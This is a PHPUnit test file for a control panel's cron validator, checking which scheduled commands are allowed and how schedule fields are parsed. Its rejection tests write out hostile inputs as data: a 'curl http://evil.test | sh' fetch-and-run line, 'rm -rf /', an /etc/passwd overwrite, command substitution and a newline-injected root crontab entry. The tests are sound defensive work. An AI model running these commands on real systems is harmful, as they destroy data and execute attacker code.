<?php

namespace Tests\Unit;

use App\Exceptions\InvalidCron;
use App\Support\CronSpec;
use PHPUnit\Framework\TestCase;

class CronSpecTest extends TestCase
{
    public function test_it_accepts_the_panel_runner_command(): void
    {
        $this->assertSame(
            '/usr/local/panel/run panel:backup:run 1',
            CronSpec::validateCommand('/usr/local/panel/run panel:backup:run 1'),
        );
    }

    public function test_it_accepts_systemctl_actions_and_reboot(): void
    {
        $this->assertSame('systemctl restart caddy', CronSpec::validateCommand('systemctl restart caddy'));
        $this->assertSame('systemctl stop stalwart', CronSpec::validateCommand('systemctl stop stalwart'));
        $this->assertSame('reboot', CronSpec::validateCommand('reboot'));
    }

    public function test_it_rejects_shell_syntax(): void
    {
        $invalid = [
            'curl http://evil.test | sh',
            '/usr/local/panel/run panel:x && rm -rf /',
            '/usr/local/panel/run panel:x; reboot',
            '/usr/local/panel/run panel:x > /etc/passwd',
            '/usr/local/panel/run panel:x $(id)',
            'systemctl daemon-reload',
            'systemctl reboot',
            'sh -c "echo hi"',
            'reboot now',
            '/bin/ls',
        ];

        foreach ($invalid as $command) {
            try {
                CronSpec::validateCommand($command);
                $this->fail("Expected [{$command}] to be rejected.");
            } catch (InvalidCron) {
                $this->addToAssertionCount(1);
            }
        }
    }

    public function test_it_rejects_multiline_commands(): void
    {
        $this->expectException(InvalidCron::class);

        CronSpec::validateCommand("/usr/local/panel/run panel:x\n* * * * * root reboot");
    }

    public function test_it_rejects_an_empty_command(): void
    {
        $this->expectException(InvalidCron::class);

        CronSpec::validateCommand('   ');
    }

    public function test_daily_fields_come_from_the_time_input(): void
    {
        $fields = CronSpec::fieldsFromRequest('daily', '07:30');

        $this->assertSame([
            'cron_minute' => '30',
            'cron_hour' => '7',
            'cron_dom' => '*',
            'cron_month' => '*',
            'cron_dow' => '*',
        ], $fields);
    }

    public function test_every_hours_fields_use_an_interval(): void
    {
        $fields = CronSpec::fieldsFromRequest('every_hours', '00:15', '6');

        $this->assertSame('15', $fields['cron_minute']);
        $this->assertSame('*/6', $fields['cron_hour']);
    }

    public function test_weekly_fields_include_the_weekday(): void
    {
        $fields = CronSpec::fieldsFromRequest('weekly', '04:00', null, '1');

        $this->assertSame('0', $fields['cron_minute']);
        $this->assertSame('4', $fields['cron_hour']);
        $this->assertSame('1', $fields['cron_dow']);
    }

    public function test_invalid_frequency_time_and_interval_are_rejected(): void
    {
        $cases = [
            fn () => CronSpec::fieldsFromRequest('sometimes', '03:00'),
            fn () => CronSpec::fieldsFromRequest('daily', '99:99'),
            fn () => CronSpec::fieldsFromRequest('every_hours', '03:00', '0'),
            fn () => CronSpec::fieldsFromRequest('every_hours', '03:00', '24'),
            fn () => CronSpec::fieldsFromRequest('weekly', '03:00', null, '7'),
        ];

        foreach ($cases as $case) {
            try {
                $case();
                $this->fail('Expected an InvalidCron exception.');
            } catch (InvalidCron) {
                $this->addToAssertionCount(1);
            }
        }
    }

    public function test_field_validation_rejects_shell_metacharacters(): void
    {
        $this->expectException(InvalidCron::class);

        CronSpec::validateFields(['* * * * *', '*', '*', '*', '*']);
    }

    public function test_field_validation_accepts_normal_cron_fields(): void
    {
        $fields = CronSpec::validateFields(['*/15', '2-6', '1,15', '1-6', '1-5']);

        $this->assertSame(['*/15', '2-6', '1,15', '1-6', '1-5'], $fields);
    }
}
